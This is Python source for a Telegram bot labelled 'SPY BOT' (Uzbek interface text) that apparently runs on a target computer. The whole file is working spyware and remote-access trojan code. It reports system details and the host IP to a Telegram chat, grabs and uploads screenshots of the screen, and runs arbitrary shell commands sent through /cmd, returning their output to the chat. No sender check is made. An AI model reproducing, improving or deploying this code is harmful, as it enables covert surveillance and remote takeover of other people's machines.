import os
import html
import psutil
import socket
import logging
import asyncio
import platform
import datetime
import threading
import subprocess
from PIL import ImageGrab
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = 'BOT_TOKEN'
ADMIN_ID = 'ADMIN_ID'

loop = asyncio.get_event_loop()
bot = Bot(token=BOT_TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot)

async def on_startup(dp):
    await notify_admin_on_start()

async def notify_admin_on_start():
    await bot.send_message(chat_id=ADMIN_ID, text="SPY BOT ishga tushdi!")

def get_computer_info():
    try:
        os_name = platform.system()
        os_release = platform.release()
        os_version = platform.version()
        os_architecture = platform.machine()
        node_name = platform.node()

        cpu_info = platform.processor()
        cpu_cores = psutil.cpu_count(logical=False)
        cpu_threads = psutil.cpu_count(logical=True)
        cpu_percent = psutil.cpu_percent(interval=1, percpu=True)

        ram_info = psutil.virtual_memory()
        ram_total = ram_info.total // (1024 ** 3)
        ram_available = ram_info.available // (1024 ** 3)
        ram_used = ram_info.used // (1024 ** 3)

        boot_time = psutil.boot_time()
        boot_time_str = datetime.datetime.fromtimestamp(boot_time).strftime("%Y-%m-%d %H:%M:%S")

        host_name = socket.gethostname()
        host_ip = socket.gethostbyname(host_name)

        info_text = (
            f"<b>Operating System</b>: <code>{os_name} {os_release} ({os_architecture})</code>\n"
            f"<b>Version</b>: <code>{os_version}</code>\n"
            f"<b>Node Name</b>: <code>{node_name}</code>\n"
            f"<b>CPU</b>: <code>{cpu_info}</code>\n"
            f"<b>Cores</b>: <code>{cpu_cores}</code>\n"
            f"<b>Threads</b>: <code>{cpu_threads}</code>\n"
            f"<b>CPU Usage</b>: <code>{', '.join([f'{cpu}% ' for cpu in cpu_percent])}</code>\n"
            f"<b>RAM Total</b>: <code>{ram_total}GB</code>\n"
            f"<b>RAM Used</b>: <code>{ram_used}GB</code>\n"
            f"<b>RAM Available</b>: <code>{ram_available}GB</code>\n"
            f"<b>Boot Time</b>: <code>{boot_time_str}</code>\n"
            f"<b>Host Name</b>: <code>{host_name}</code>\n"
            f"<b>Host IP</b>: <code>{host_ip}</code>"
        )
    except Exception as e:
        info_text = f"Error occurred while fetching system information: {str(e)}"
    return info_text


@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    await message.reply("<b>Salom, Botga xush kelibsiz!\n\n/info - Kompyuter Haqida\n/screen - ScreenShot Monitor\n/cmd - Terminal codelarni ishga tushirish</b>")
    
@dp.message_handler(commands=['info'])
async def send_computer_info(message: types.Message):
    info_text = get_computer_info()
    await bot.send_message(chat_id=message.chat.id, text=info_text)
    
def screenshot(chat_id, screenshot_path):
    screenshot_img = ImageGrab.grab()
    screenshot_img.save(screenshot_path)
    asyncio.run_coroutine_threadsafe(bot.send_photo(chat_id=chat_id, photo=open(screenshot_path, 'rb')), loop)


@dp.message_handler(commands=['screen'])
async def send_screen(message: types.Message):
    screenshot_path = 'screenshot.png'
    threading.Thread(target=screenshot, args=(message.chat.id,screenshot_path)).start() 


def run_command_in_thread(command, chat_id):
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        escaped_result = html.escape(result)
        
        asyncio.run_coroutine_threadsafe(bot.send_message(chat_id=chat_id, text=f"<code>{escaped_result}</code>"), loop)
    except Exception as e:
        asyncio.run_coroutine_threadsafe(bot.send_message(chat_id=chat_id, text=f"Error occurred: {str(e)}"), loop)




@dp.message_handler(commands=['cmd'])
async def run_command(message: types.Message):
    if message.text == '/cmd':
        await message.reply("Command not found!")
        return True
    command = message.text.split('/cmd ', 1)[1]
    threading.Thread(target=run_command_in_thread, args=(command, message.chat.id)).start()


if __name__ == '__main__':
    executor.start_polling(dp, on_startup=on_startup, skip_updates=True)
